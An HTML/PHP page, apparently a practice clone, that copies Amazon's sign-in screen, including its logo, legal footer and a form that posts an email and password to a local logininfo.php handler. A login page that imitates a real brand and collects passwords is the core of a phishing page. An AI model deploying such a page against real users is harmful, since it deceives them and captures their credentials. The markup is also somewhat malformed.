<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon"href="./Images/amazon-icon.png" >
    <title>Amazon Sign In</title>
    <link rel="stylesheet" href="./CSS/login.css?v=<?php echo time(); ?>" >
    <form action="logininfo.php" method="post">   
</head>

<body>
    <div class="logo">
        <img src="./Images/logo.jpeg" id="logo1">
    </div>

    <div class="container block">
        <p id="sign" class="margin">Sign in</p>
        <label class="block margin" id="enum" reqired><b>Enter mobile phone number or email</b></label>
        <input type="text" name="value" class="margin block" id="email">
        <label class="margin block" id="pass"><b>Password</b></label>
        <input type="password" name="password" class="margin block" id="password" required>
        <input type="submit" class="block margin" value="Sign in" id="continue" onclick="validate()">
        <p class="block margin" id="use">By continuing, you agree to Amazon's <a href="#" class="link">Conditions of Use</a> and <a href="#" class="link" >Privacy Notice</a>.</p>
        <details class="block margin" id="help">
            <summary style="color: gray;"><a href="#" class="link" style="margin-left: 5px;">Need help?</a></summary>
            <p class="block" id="help" style="margin-left: 18px;"><a href="#" class="link">Forgot Password</a></p>
            <p class="block" id="help" style="margin-left: 18px;"><a href="#" class="link">Other issues with Sign-in</a></p>
        </details>

    </div>
     
    <img src="./Images/Screenshot 2023-04-05 163151.png" alt="" class="new">

    <button id="account" onclick="location.href='Account.php'">Create your Amazon account</button>

    <div class="line"></div>

    <nav class="navbar">
        <ul>
            <li><a href="#" class="link">Conditions of Use</a></li>
            <li><a href="#" class="link">Privacy Notice</a></li>
            <li><a href="#" class="link">Help</a></li>
        </ul>
    </nav>
    <p id="inc">© 1996-2023, Amazon.com, Inc. or its affiliates</p>
    
    <script>
        function validate(){
            let name = document.getElementById('email').value;
            let password = document.getElementById('password').value;
            if(name == '')
            {
                alert('Email cannot be blank');
            }   
            if(password.length<6)
            {
                if(password == '')
                {
                    alert('Password cannot be blank');
                }
                else
                {
                    alert('Password should be greater than 6 characters');
                }
            }
            // else
            // {
            //     window.location = 'Index.php';
            // }
        }


</script>
</form>

</body>

</html>]